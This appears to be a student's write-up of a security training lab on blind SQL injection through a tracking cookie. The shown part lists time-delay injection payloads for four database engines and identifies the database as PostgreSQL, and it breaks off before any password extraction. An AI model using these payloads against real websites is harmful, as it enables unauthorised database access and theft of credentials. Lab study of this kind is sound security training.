Lab #2 - Blind SQL injection with time delays and information retrieval

Vulnerability - This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
                The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

Goal - The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
        To solve the lab, log in as the administrator user.

Analysis:
1. Check the type of database being used:
- MICROSOFT SQL SERVER: '%3b+IF(1=1)+WAITFOR+DELAY+'0:0:10'+-- => FALSE
- MySQL: '%3bSELECT+IF(1=1, SLEEP(5), 0)%20+-- => FALSE
- PostgreSQL: '%3b+SELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--=> TRUE
- Oracle: '%3bSELECT+CASE+WHEN(1=1)+THEN+DB_PIPE.RECEIVE_MESSAGE('a',10)+ELSE+NULL+END+FROM+dual--=> FALSE
=> The type of database is PostgreSQL
